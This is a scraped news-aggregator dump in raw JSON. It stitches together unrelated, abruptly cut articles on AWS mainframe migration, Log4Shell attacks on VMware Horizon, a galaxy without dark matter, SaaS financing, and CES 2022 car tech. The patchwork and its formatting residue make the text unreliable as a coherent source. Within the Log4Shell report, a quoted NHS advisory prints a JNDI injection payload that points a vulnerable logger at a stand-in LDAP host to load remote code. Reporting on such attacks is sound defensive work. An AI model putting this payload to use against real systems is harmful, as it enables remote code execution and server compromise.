Some might want to refactor their mainframe workloads to run on AWS by transforming legacy applications \u2013  likely written in COBOL \u2013 into modern Java-based cloud services.\n  Alternatively, customers can keep their applications as written and re-platform their workloads to AWS reusing existing code with minimal changes.\n  Mainframe Modernization promises a complete, end-to-end migration pipeline that includes development, testing, and deployment tools necessary to automate the process.\n  \u201cWith today\u2019s launch of AWS Mainframe Modernization, customers and systems integrators can now more quickly modernize their legacy mainframe workloads in a predictable way and get rid of much of the complexity and manual work involved in migrations,\u201d said William Platt, GM of Migration Services at AWS.\n  The service puts the cloud vendor at odds with mainframe manufacturers and specialist software vendors that include IBM, Unisys, Bull, NEC, and Fujitsu.\n  Mainframe Modernization was presented at this week\u2019s re:Invent conference in Las Vegas, where AWS also announced the expansion of the Outpost hardware line-up, a private 5G networking service, and new EC2 instances.\n    More than 50 years after the appearance of the first mainframe, the IBM System/360, these hulking machines are still a common sight in banking, insurance, and retail, thanks to their ability to efficiently process huge volumes of transactions, and their reputation for security and uptime.\n  However, these systems are incredibly expensive and difficult to maintain, and the pool of people qualified to deal with their legacy software is shrinking all the time.\n  AWS has been trying to get customers off mainframes and into its data centers  for years. This time, the company says it has built a runtime enthronement provides all the necessary compute, memory, and storage to run both refactored and replatformed applications while automatically handling capacity provisioning, security, load balancing, scaling, and application health monitoring.\n  Since this is all done via public cloud, there are no upfront costs, and customers only pay for the amount of compute provisioned.\n  Brazil\u2019s Banco Inter was among the first organizations to sign up for Mainframe Modernization with AWS.\n  \u201cBy using the AWS Mainframe Modernization managed runtime, we expect to simplify our card processor operations for enhanced resiliency and scalability,\u201d said Guilherme Ximenes, CTO at Banco Inter. \u201cWe are also excited by the DevOps CI/CD pipeline for increasing the agility we need to more quickly deliver new credit and debit card transaction capabilities to our customers.\u201d\n  AWS Mainframe Modernization is available in preview in US East (N. Virginia), US West (Oregon), Asia Pacific (Sydney), EU (Frankfurt), and South America (S\u00e3o Paulo) regions, before being expanded to additional locations \u201cin the coming months.\u201d\n  The AWS approach to refactoring legacy software is not unique: a similar model has been promoted by other companies, like the Swiss startup LzLabs, which has been developing a product called Software-Defined Mainframe since 2011, based on its own COBOL and Java interoperability architecture.\n  Going in a different direction, the Open Mainframe Project  founded in 2015 is attempting to make existing machines a lot more useful, by teaching them to run on Linux, rather than proprietary operating systems like z/OS.\n  It would be useful to note that the death of the mainframe has been predicted for  at least two decades, and yet these machines have managed to stay surprisingly relevant.\n  Do you have strong opinions about mainframes?

It resides in Log4J, a system-logging code library used in thousands if not millions of third-party applications and websites. That means there is a huge base of vulnerable systems. Additionally, the vulnerability is extremely easy to exploit and allows attackers to install Web shells, which provide a command window for executing highly privileged commands on hacked servers.\n  The remote-code execution flaw in Log4J  came to light in December after exploit code was released before a patch was available. Malicious hackers quickly began  actively exploiting CVE-2021-44228 to  compromise sensitive systems.  \u201cAn unknown threat group has been observed targeting VMware Horizon servers running versions affected by  Log4Shell vulnerabilities in order to establish persistence within affected networks,\u201d officials with the UK\u2019s National Health System  wrote. They went on to provide guidance on specific steps affected organizations can take to mitigate the threat.\n Chief among them is the recommendation to install an update that\u00a0 VMware released for its Horizon product, which gives organizations a means to virtualize desktop and app capabilities using the company\u2019s virtualization technology. NHS officials also noted signs that vulnerable organizations can look for to identify any possible attacks they may have sustained.\n  The advisory comes a day after the Federal Trade Commission\u00a0 warned consumer-facing businesses to patch vulnerable systems to avoid the fate of Equifax. In 2019, the credit-reporting agency agreed to  pay $575 million to settle FTC charges resulting from its failure to patch a similarly severe vulnerability in a different piece of software known as Apache Struts. When an unknown attacker exploited the vulnerability in Equifax\u2019s network, it led to the  compromise of sensitive data for 143 million people, making it among one of the  worst data breaches ever. \u201cThe FTC intends to use its full legal authority to pursue companies that fail to take\u202freasonable\u202fsteps to protect consumer data from exposure\u202fas a result of Log4j or similar known vulnerabilities in the future,\u201d FTC officials  said\n    The NHS is at least the second organization to observe exploits targeting a VMware product. Last month, researchers  reported that attackers were targeting systems running VMware VCenter with the aim of installing the Conti ransomware.\n The attacks targeting unpatched VMware Horizon servers take aim at its use of an open source service.\n \u201cThe attack is very likely initiated via a Log4Shell payload similar to ${jndi:ldap://example.com},\u201d the NHS advisory stated. \u201cThe attack exploits the Log4Shell vulnerability in the Apache Tomcat service which is embedded within VMware Horizon. This then launches the following PowerShell command, spawned from ws_TomcatService.exe:\u201d\n  Following a few additional steps, the attackers are able to install a Web shell that has persistent communication with a server they control.

But unlike almost every other galaxy ever seen\u2014including our own Milky Way\u2014they didn\u2019t seem to be enshrouded in huge masses of dark matter, which would normally hold those stellar metropolises together with their gravity. The scientists picked one to zoom in on, a modest-sized galaxy about 250,000 light-years away, and they pointed the 27 radio telescope antennas of the Very Large Array in New Mexico at it.\n After gathering 40 hours\u2019 worth of data, they mapped out the stars and gas and confirmed what the earlier snapshots had hinted at: \u201cThe dark matter content that we infer in this galaxy is much, much smaller than what you would expect,\u201d says Fraternali, an astronomer at Kapteyn Astronomical Institute of the University of Groningen in the Netherlands. If the team or their competitors find other such galaxies, it could pose a challenge for scientists\u2019  view of  dark  matter, the dominant perspective in the field for at least 20 years. Fraternali and his team  published their findings in December in the  Monthly Notices of the Royal Astronomical Society.\n Based on decades of telescope observations and computer simulations, scientists have come to think of dark matter as the hidden skeleton of the cosmos; its \u201cjoints\u201d are massive clumps of invisible particles which host galaxies large and small. But Fraternali isn\u2019t the first to glimpse an exception to that rule. A few years ago, Pieter van Dokkum, an astronomer at Yale, and his colleagues  discovered similar galaxies with the  Hubble telescope that also seemed to lack dark matter. \u201cThese galaxies that we found in 2018, they created a lot of controversy and discussion and follow-up work because they were unexpected and difficult to explain,\u201d van Dokkum says.\n    Those other galaxies lived in a crowded environment, where bigger, neighboring galaxies frequently fly by, possibly pulling away dark matter with them. In contrast, Fraternali\u2019s galaxy is pretty isolated, with no such bothersome neighbors, so its dearth of dark matter can\u2019t be explained that way. \u201cIt could be very significant,\u201d van Dokkum says. \u201cHow do you get stars and gas in that location together without the help of dark matter?\u201d\n These strange objects have come to be called \u201cultra-diffuse galaxies.\u201d They\u2019re extreme outliers: In terms of their mass, they\u2019re minuscule, but they\u2019re spread out over vast distances. Some are as large as the Milky Way, but with only a hundredth as many stars\u2014or even fewer. They\u2019re so close to being transparent that they\u2019re tough to spy in the night sky. \u201cThey\u2019re slightly fainter in the center, so they\u2019re difficult to detect. Now, with better telescopes and deeper observations, they have become more well known,\u201d says Mireia Montes, an astronomer at the Space Telescope Science Institute in Baltimore and an expert on such galaxies.\n Starting in the 1960s, American astronomer Vera Rubin and others first revealed the likely existence of unseen, or \u201cdark,\u201d matter while measuring how fast stars in galaxies whirl around the center, showing that inner stars orbit at different speeds than outer ones. Based on those stars\u2019 rotation, scientists calculated how much mass the galaxy must have to keep them constantly orbiting, rather than being flung into space. For many galaxies, that mass was many times larger than that of all the stars added up. Scientists resolved the problem by inferring the presence of some kind of dark matter, which doesn\u2019t emit or reflect light, and which must be making up the rest of the mass that\u2019s holding the galaxy together.", "posttime": "2022-01-10 00:22:43", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "\u6697\u7269\u8d28,discover,\u661f\u7cfb", "title": "\u5929\u6587\u5b66\u5bb6\u53d1\u73b0\u4e00\u4e2a\u6ca1\u6709\u6697\u7269\u8d28\u7684\u5947\u602a\u7684\u661f\u7cfb", "title_en": "Astronomers discover a strange galaxy without dark matter", "transed": 1, "url": "https://arstechnica.com/science/2022/01/astronomers-discover-a-strange-galaxy-without-dark-matter/", "via": "", "real_tags": ["\u6697\u7269\u8d28", "discover", "\u661f\u7cfb"]}, {"category": "", "categoryclass": "", "imagename": "6e6da9d28a385fb2f3a94fa10fb4c084.jpg", "infoid": 1072523, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Miguel Fernandez\u662fCapchase\u7684\u9996\u5e2d\u6267\u884c\u5b98\u548c\u8054\u5408\u521b\u59cb\u4eba\u3002\u4ed6\u5bf9\u6539\u53d8\u8425\u8fd0\u8d44\u91d1\u52a8\u6001\u7684\u70ed\u60c5\uff0c\u4f7f\u5176\u6210\u4e3a\u6280\u672f\u516c\u53f8\u7684\u4e3b\u8981\u73b0\u91d1\u6765\u6e90\u3002\n\u6536\u5165\u878d\u8d44\u4f7f\u516c\u53f8\u80fd\u591f\u5728\u5065\u5eb7\u7684\u6210\u957f\u8f68\u9053\u4e0a\u7acb\u5373\u4ece\u5ba2\u6237\u7684\u6708\u5ea6\u4ed8\u6b3e\u4e2d\u7acb\u5373\u83b7\u53d6\u672a\u6765\u7684\u73b0\u91d1\u6d41\u91cf\u3002\u53e6\u4e00\u4e2a\u597d\u5904\u662f\u501f\u6b3e\u4eba\u7684\u4fe1\u7528\u9650\u989d\u53ef\u4ee5\u6839\u636e\u5176\u6bcf\u6708\u9884\u671f\u589e\u957f\u8c03\u6574\uff0c\u4ed6\u4eec\u53ef\u4ee5\u5728\u9700\u8981\u65f6\u7ed8\u5236\u8d44\u91d1\u3002", "note_en": "Miguel Fernandez is CEO and co-founder of  Capchase. He is passionate about changing working capital dynamics to make it the main source of cash for tech companies.\n  Choosing the right financing partner can be tedious, as they need to align with your mission, values and objectives. Otherwise, you get stuck in a relationship that doesn\u2019t align with your goals and may lead you ending up with lower ownership than expected.\n Here\u2019s a rundown of how alternative financing came to be, how it can benefit high-growth SaaS startups and how to know if it\u2019s right for you.\n  There is a dearth of non-dilutive financing options for growth-stage, recurring-revenue businesses. We\u2019ve found that traditional sources of debt capital (such as banks) simply prefer to provide debt to asset-heavy businesses where collateral can be secured.\n  When it comes to SaaS or asset-light business models, there simply isn\u2019t an asset base to collateralize, which makes traditional debt providers uncomfortable. Moreover, while subscription or recurring revenue business models aren\u2019t technically new, they have been undersupported. SaaS companies can often only look to traditional banks for financing after achieving profitability and/or receiving institutional venture capital backing.\n This rules-based approach is pragmatic, but results in a massive gap in the market for early-stage companies that have achieved product-market fit and serious revenue traction.

It\u2019s a device, connecting you with the other devices that run your life. It\u2019s an assistant, anticipating your needs by creepily watching you and collecting data on your every movement.\n The big themes this year focused on services and experiences that drivers and passengers can have inside vehicles, the advanced driver-assistance systems (ADAS) and automated driving features that handle some of the drudgery of driving so you can have those experiences, and the compute power needed to deliver it all.\n  Of course, there was other vehicle tech that popped up: Who can forget BMW\u2019s color-changing car? NFTs even made an appearance. Here\u2019s the in-vehicle tech that stood out to us.\n  We heard a lot about digital cockpits that transform the front cab into a world of digital content, entertainment and services. Many companies threw around the term \u201cco-pilot\u201d and depending on how that company defined it, the co-pilot could include voice assistants or even actual driver-assistance systems that can control certain functions of the vehicles. And there were deep insinuations that one should never, if one can help it, stop watching TV or streaming video \u2014 especially not when in a moving vehicle.\n All of that requires processing power and at 2022 CES the automotive chip game was on.\n    Qualcomm doubled down on its commitment to powering  automotive in-vehicle tech at CES 2022 by bringing on new OEM clients. The tech giant\u2019s Snapdragon Digital Chassis offers automakers a platter of cloud-connected \u201cplatforms\u201d consisting of systems on a chip (SoC) and software that can be adopted in full or \u00e0 la carte.\n The chassis includes: the Snapdragon Ride Platform for ADAS and automated driving, the Auto Connectivity Platform for LTE, 5G connected services, cellular vehicle-to-everything (C-V2X), Wi-Fi, Bluetooth and precise positioning, and the next generation of the Snapdragon Cockpit, a digital cockpit and infotainment system.\n Volvo and Honda announced plans to integrate the digital cockpit into upcoming electric vehicles, and Renault, which has already committed to bringing the cockpit into future cars, expanded the partnership to include everything the chassis has to offer. General Motors will also be relying on Snapdragon to  power its next-gen ADAS.\n  While Volvo\u2019s infotainment is being powered by Qualcomm\u2019s SoC, its new automated driving (AD) features will be powered by Nvidia\u2019s.  Autonomous trucking startup TuSimple also said at CES 2022 that it would use Drive Orin to power and scale its self-driving tech.\n Nvidia\u2019s chip is a central computer for intelligent vehicles that\u2019s made specifically for autonomous applications. It delivers 254 trillion operations per seconds and provides the sort of auto-grade compute power needed to handle self-driving functions.\n JiDU Auto, Baidu\u2019s electric vehicle company, also announced it will use the Nvidia Drive Orin SoC. This next-generation vehicle with Level 4 autonomous driving capability will make its debut at the Beijing Auto Show in April, followed by mass production and delivery by 2023.\n Other companies using Drive Orin include\u00a0Polestar, IM Motors, Li Auto, NIO, R Auto and Xpeng.\n  Intel subsidiary Mobileye announced plans to bring a  new supercomputer to market designed to give passenger cars, trucks and SUVs autonomous driving powers.\n The company introduced at the 2022 CES tech trade show a new system on chip called EyeQ Ultra that is purpose-built for autonomous driving. The company said the first silicon for the EyeQ Ultra SoC, which is capable of 176 trillion operations per second (TOPS), is expected at the end of 2023 with full automotive grade production in 2025.\n The company also introduced at CES its next-generation EyeQ SoC for advanced driver-assistance systems called EyeQ6L and EyeQ6H.\n  What do you get when you combine the internet with insane processing power in a vehicle? A sci-fi world of incredible, and some might say unnecessary, tech that lets car owners sync their digital and physical worlds.\n Want to program your car to order you a pizza as you leave the office so it\u2019s hot and ready when you get home? It can be done. Feel like hearing the stats on your battery\u2019s power and vehicle range? Speak and it shall be delivered. Want to put your feet up and watch the latest episode of \u201cThe Wheel of Time\u201d? There\u2019s tech for that, too.\n The in-vehicle tech displayed at CES drilled home the idea of the car as a connected device that is meant to make your life easier, smoother and more entertaining.\n   Many cars today run their infotainment systems off of Android\u2019s auto operating system, making it easier to access your phone and compatible apps on your phone from your car. This year, Google took it a few steps further.\n Volvo and Google announced an integration with the Google Home ecosystem, which would allow Volvo car owners to issue voice commands to Google Assistant-enabled devices. They can tell the assistant to do things like turn the car on and off, heat it up or cool it down and provide car info like battery life. Volvo also shared plans to enable YouTube app downloads, thanks to both Google integrations with Volvo vehicles and Qualcomm\u2019s Snapdragon cockpit.\n Google also added features to its digital car key with BMW, which enables users to lock, unlock and start certain BMW cars with select Google Pixel and Samsung Galaxy phones. Now, the car will automatically unlock itself when the device gets close enough, and users can share their digital car key with friends or family.\n   In previous years at CES, Amazon showed up in a number of vehicles via its virtual assistant Alexa. This year, the power of Alexa is combining with  Amazon\u2019s Fire TV streaming platform, which is working its way into more cars.\n Last year, global automaker Stellantis integrated the Fire TV into its vehicles, and at CES 2022, we\u2019re seeing the in-car entertainment systems of certain Jeep, Chrysler,  BMW and Ford vehicles get an upgrade, as well.\n Fire TV for cars will do more than offer a TV streaming platform. It\u2019ll sync with Alexa so drivers and passengers can simply speak a command and  poof!, \u201cOlaf Presents\u201d is playing in the backseat and your children are blessedly quiet. Users can also ask Alexa to show their Ring doorbell video on the Fire TV using voice commands.\n Stellantis is getting even cozier with Amazon. At CES 2022, Stellantis  announced a wide-ranging collaboration that will touch nearly every aspect of its business. Amazon\u2019s technology will be used to help Stellantis develop vehicles, build connected in-vehicle experiences and train the next generation of automotive software engineers.\n As part of this multiyear deal, Stellantis has selected Amazon Web Services (AWS) as its preferred cloud provider for vehicle platforms. Stellantis, which recently launched a software academy for existing and new employees, is also working with AWS to create a curriculum that will cover software, data and cloud technology.\n  Software company Cerence unveiled its Cerence Co-Pilot, an in-car assistant that uses continuous learning to anticipate the needs of drivers and proactively initiate actions. The co-pilot is integrated with the car\u2019s sensors and data to understand the environment inside the vehicle and around it, analyzing things like voice, gaze, gesture and touch to understand user preferences and perform actions on the driver\u2019s behalf.\n Cerence\u2019s co-pilot can do things like control smart home and IoT devices, authorize payments for in-car purchases and remind drivers about car maintenance needs, even scheduling a trip to the shop for them.\n While the company didn\u2019t share which automakers are signed onto integrate the co-pilot, a video demonstrating the tech showed such brands as Volvo, BMW, Audi and Mercedes, some of which have worked with Cerence in the past.\n  Blackberry announced a partnership with Pateo, an internet-of-vehicles service and product provider in China, that will see Blackberry Ivy, the company\u2019s intelligent vehicle data platform co-developed with Amazon Web Services, integrated into Pateo\u2019s digital cockpit solution. The two companies are to work with an unnamed Chinese automaker to pilot the cockpit on its electric model lineup.\n The software company most renowned for its mobile phones didn\u2019t share much about what that cockpit would look like, but it should encompass such features as intelligent voice, entertainment, vehicle health monitoring, secure payment and cloud technology. Blackberry and Pateo will also incorporate Electra Vehicles\u2019s EVE-Ai 360 Adaptive Controls that provides prediction of battery state of charge, state of health and project vehicle range.\n  In past years, autonomous driving took center stage. This year, the focus was more on advanced driver-assistance systems and promises to bring restricted automated driving features to passenger vehicles. Due to the advancements in vehicle sensors, compute power and software, automakers are working to automate certain aspects of the car, like parking or highway driving.\n That doesn\u2019t mean some companies pursuing so-called Level 4 autonomous driving didn\u2019t show up at CES; they just weren\u2019t the ones yelling the loudest this year.\n  As we mentioned earlier, GM\u2019s new Ultra Cruise hands-free ADAS system will be powered by Qualcomm\u2019s Snapdragon SoC. GM introduced the Ultra Cruise system in 2021, but this was the first time we heard more details about the compute and some of the capabilities.\n The system is an upgrade from the automaker\u2019s Super Cruise ADAS first introduced in 2017, and it\u2019s expected to be able to handle 95% of all driving scenarios.\n Ultra Cruise, which is coming to the new electric Cadillac Celestiq in 2023, will rely on sensors like cameras, radar and lidar (not just lidar map data) to feed data to GM\u2019s software that will then output decisions.\n   Volvo shared plans to work with  lidar company Luminar and AD software company Zenseact to introduce Ride Pilot as an add-on subscription to an electric SUV that will be revealed later this year. Ride Pilot is an \u201cunsupervised\u201d AD feature, meaning it can drive itself fully while drivers are on certain highways, giving them the ability to go completely hands and eyes free so they can enjoy other activities, like the YouTube watching we mentioned earlier.\n  Chinese internet giant Baidu\u2019s EV startup JiDU came to CES 2022 with news that it would power its first production EV model, which is expected to begin deliveries in 2023, on Nvidia\u2019s Drive Orin SoC (as mentioned above). The company said it would have Level 4 autonomous driving capabilities, all of which would be revealed in April at the Beijing Auto Show.\n JiDu is just a year old and recently demonstrated intelligent assisted driving in both urban and high-speed areas in its SIMUCar.\n   While not entirely focused on autonomous driving capabilities or ADAS features, it\u2019s worth noting how  Cadillac envisions the inside of its future autonomous vehicles. Its InnerSpace concept shows your standard spaceship-looking two-seater car from the outside, while inside it still looks like a spaceship. But like a sexy spaceship.\n Rather than separate driver and passenger seats, there\u2019s a plush and sleek loveseat that appears to constantly be in recline mode, which checks out given the built-in ottoman and compartment for slippers and a blanket. A mere couple of feet in front of the passengers\u2019 heads is a wide, curved screen. No steering wheels or pedals are featured.\n   Last October, teams from around the world converged on the Indianapolis Motor Speedway to demonstrate autonomous racing.\n The teams gathered again, this time at the Las Vegas Motor Speedway on January 7 with the Autonomous Challenge @ CES. IAC university teams developed the software that runs the autonomous racecar, the Dallara AV-21.\n Leading up to the event, the organization published a few videos, including this  one that was filmed at night.\n  Gentex, which supplies automotive and aerospace sectors, showed off the results of two acquisitions in 2021: Israel-based Guardian Optical Technologies and Vaposens.\n The company showed a lot, but its ultra-sensitive driver monitoring system that is designed to be used to support driver-assistance systems got our attention. Guardian Optical Technologies developed an infrared-sensitive, high-resolution camera combining machine vision, depth perception and micro-vibration detection. What this means is its proprietary sensor configuration can monitor the entire vehicle cabin and all its objects and occupants, assessing their behavior, gestures and activities.\n    In addition to revealing three new EVs at CES this year, Vietnamese EV company Vinfast announced the formation of its early-bird reservation site. The first to preorder will receive a \u201cVinFirst\u201d certificate on the blockchain platform in NFT form, which the company says is a completely transparent way to prove ownership of an order number.\n The term \u201cdigital twin\u201d popped up a few times in the automotive sector at CES 2022, including an announcement from Cerence and Vinfast. The gist is this: Cerence has cloud-based software that allows Vinfast (or any other company intrigued by the product) to create a virtual representation of its entire car, including software, mechanics, electrics and physical behavior, along with driver data and environmental data.\n  Indi EV, a California-based EV startup, came out with a prototype of its Indi One at CES, which the company says is \u201cthe world\u2019s first social media-oriented car.\u201d What that seems to mean is a car that has an integrated computer for gaming, a complete Windows workstation that can handle Zoom calls and even record events that can later be shared on social media and software that lets riders capture trip content and video to be uploaded to the cloud.\n If all that wasn\u2019t enough, the Indi One is meant to enable a type of mobile blockchain, wherein each vehicle can act as a node for a blockchain. Exactly why that\u2019s significant is unclear, but You Do You, Indi EV. Customers can start preordering by the end of Q1, and the car is expected to go for around $45,000.\n  BMW  unwrapped its color-changing car at CES, the BMW iX Flow. Right now, the e-paper wrapping the vehicle can only change between black and white, but more colors are expected in the future that will enable users to give their car a more personalized look to match their mood.\n  NextbaseDash cam tech company Nextbase unveiled its smart and connected dash cam, the Nextbase iQ. It gives drivers a lot of the same safety and security features they would get in their home-monitoring systems, like real-time alerts and access to incident video even while they\u2019re away from their car. Users can also get real-time access to the dash cam from anywhere at anytime through the iQ app.\n  Finally, Mercedes revealed the  Vision EQXX, a concept vehicle that is meant to showcase what the automaker\u2019s electric future will look like. This eye-popping sport EV wasn\u2019t just about aerodynamics and a sleek design. The company squeezed in power, efficiency and range into the compact and sporty package.\n  Some of the neat tech in the EQXX worth noting is the\u00a0one-piece 47.5-inch LED display with 8K resolution. The infotainment screen has responsive real-time graphics that will span the width of the vehicle, according to Mercedes.\n The automaker worked with NAVIS Automotive Systems to develop a 3D navigation system that users can zoom into and scroll around for this massive screen. And like the company\u2019s newer models, the EQXX also featured an advanced voice assistant and software that learns your behavior over time.\n  In the lidar world, Luminar\u2019s eyebrow-raising stunt comparing Tesla\u2019s ADAS system to its own (to the peril of several child-size dummies) was affecting, and its inclusion in Volvo vehicles and Mobileye systems is a coup. But it\u2019s still an expensive and complex system, a major investment with uncertain (if potentially significant) benefits.\n Here\u2019s me driving the Tesla Model Y on the left. It, of course, doesn\u2019t have LiDAR.

Costs haven\u2019t come down as much as they\u2019d like, and there\u2019s still confusion over who does what in a perception stack.\n Blickfeld is attempting to take over as much as possible, for instance, with on-device movement detection, object classification and so on, which could make their devices easier to drop in \u2014 or possibly make them partially redundant with an already intelligent in-car computer vision system.\n Arbe is focusing more narrowly on what it calls \u201cfree space mapping,\u201d where it doesn\u2019t matter if it\u2019s a bush or a raccoon or what \u2014 the question is, is it safe to drive on? A quick, dedicated sensor for identifying driveable surfaces in the vicinity could be a useful feature and one that contributes to the autonomous vehicle collective intelligence.\n Innoviz is improving on the traditional spinning puck lidar type, which has proven to be useful in many circumstances. A cheaper, better version may find success where trailblazer Velodyne has over the years.\n Similarly,  Voyant Photonics is leaving the whole automotive market to deeper pockets, focusing on producing its tiny, inexpensive lidar unit for robotics and industrial applications, where certifications and liabilities aren\u2019t quite so intense.\n There\u2019s no doubt lidar has a future in autonomous vehicles and other equipment, but what form it will take and how much people will pay for it \u2014 that\u2019s still very much up in the air, something that no doubt makes everyone in the sector a little nervous.", "posttime": "2022-01-10 00:19:49", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "\u672a\u6765,future,\u6c7d\u8f66", "title": "CES 2022\u7684\u6700\u4f73\uff08\u548c\u6700\u5947\u602a\uff09\u672a\u6765\u7684\u6c7d\u8f66\u6280\u672f", "title_en": "\n\t\t\t\tThe best (and weirdest) future car tech at CES 2022\t\t\t", "transed": 1, "url": "https://techcrunch.com/2022/01/07/ces-2022-best-weirdest-car-tech/", "via": "", "real_tags": ["\u672a\u6765", "future", "\u6c7d\u8f66"]}]
